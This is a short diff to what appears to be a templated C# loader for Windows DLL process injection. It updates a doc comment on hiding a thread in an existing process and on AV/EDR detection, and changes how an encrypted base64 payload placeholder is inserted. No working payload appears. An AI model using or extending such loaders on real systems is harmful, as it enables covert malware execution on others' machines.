@@ -7,6 +7,10 @@
     API calls to 'hide' the thread in a existing windows
     process.
 
+    IMPORTANT: The library given in input must have a
+    'DllMain()' function so it can receive call from
+    the Windows's API function 'LoadLibraryA()'.
+
     NOTICE: As the dll is written to disk in clear, it can
     trigger AV/EDR detection and be flagged accordingly.
 #}
@@ -50,7 +54,7 @@ class Program
         byte[] saltBytes = HexStringToByteArray(salt);
         byte[] ivBytes = HexStringToByteArray(iv);
 
-        string ciphertext = "{{ ciphertext }}";
+        string ciphertext = {{ ciphertext }};
         byte[] encryptedBytes = Convert.FromBase64String(ciphertext);
 
         byte[] decryptedData;
